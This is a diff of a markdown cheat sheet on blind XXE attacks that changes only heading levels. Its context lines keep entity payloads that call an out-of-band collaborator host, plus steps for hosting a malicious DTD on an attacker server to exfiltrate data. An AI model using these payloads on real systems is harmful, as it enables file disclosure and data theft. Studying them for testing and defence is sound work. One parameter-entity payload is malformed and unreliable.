@@ -25,17 +25,17 @@
   * OAST technique using collaborator or similar tools&#x20;
   * By triggering error messages that can contain sensitive data
 
-#### **Blind XXE with Out-of-Band Interaction**
+### **Blind XXE with Out-of-Band Interaction**
 
 * `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:burpcollaborator"> ]>`&#x20;
 * Invoke `&xxe;` in any of the existing data elements or within the XML document
 
-#### **Blind XXE with Out-of-Band Interaction via XML Parameter Entities** &#x20;
+### **Blind XXE with Out-of-Band Interaction via XML Parameter Entities** &#x20;
 
 * `<!DOCTYPE foo [ <!ENTITY % xxe; SYSTEM "http://burpcollaborator" > %xxe; ]>`&#x20;
 * Invoke `%xxe;` within the existing DTD if the above method does not work
 
-#### **Exploiting Blind XXE to Exfiltrate Data Out-of-Band** <sub>(only if application allows to fetch contents remotely)</sub>
+### **Exploiting Blind XXE to Exfiltrate Data Out-of-Band** <sub>(only if application allows to fetch contents remotely)</sub>
 
 * Create a `malicious.dtd` external DTD file and host it in attacker controlled server to be fetched by victim server
 * Payload to be provided in victim application
@@ -54,7 +54,7 @@
 
 </details>
 
-#### **Exploiting Blind XXE to Retrieve Data via Error Messages** <sub>(only if application allows to fetch contents remotely)</sub>
+### **Exploiting Blind XXE to Retrieve Data via Error Messages** <sub>(only if application allows to fetch contents remotely)</sub>
 
 * Effective only if the application returns the resulting error message within its response
 * Host external DTD `malicious.dtd`&#x20;
@@ -77,7 +77,7 @@
 
 </details>
 
-#### **Exploiting Blind XXE by Repurposing a Local DTD** <sub>(if remote fetching of DTD file is not allowed)</sub>
+### **Exploiting Blind XXE by Repurposing a Local DTD** <sub>(if remote fetching of DTD file is not allowed)</sub>
 
 * Exploitable if a document's DTD uses hybrid model (ie internal and external DTD declarations)
 * The restriction on using an XML parameter entity within the definition of another parameter entity is relaxed
